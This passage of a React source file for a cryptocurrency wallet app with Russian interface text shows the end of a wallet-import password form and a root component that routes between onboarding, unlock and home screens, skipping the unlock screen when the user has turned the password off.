      <OInputRow type="password" placeholder="Новый пароль (минимум 6 символов)" value={password} onChange={setPassword} />
      <OInputRow type="password" placeholder="Повторите пароль" value={password2} onChange={setPassword2} />
      <div style={{ flex: 1 }} />
      <OErr msg={error} />
      <OBtn onClick={handleImport} disabled={localLoading}>{localLoading ? "Импорт…" : "Импортировать"}</OBtn>
    </ORoot>
  );
}

/* ─── Root component — state router ─────────────────────────── */
export default function GemWalletApp() {
  const { hasWallet, isUnlocked, settings, bypassUnlock } = useWallet();
  useEffect(() => {
    if (hasWallet && !isUnlocked && settings && settings.passEnabled === false) {
      bypassUnlock();
    }
  }, [hasWallet, isUnlocked, settings, bypassUnlock]);
  if (!hasWallet) return <LivePricesProvider><OnboardingScreen /></LivePricesProvider>;
  if (!isUnlocked) return <LivePricesProvider><UnlockScreen /></LivePricesProvider>;
  return <LivePricesProvider><WalletHomeUI /></LivePricesProvider>;
}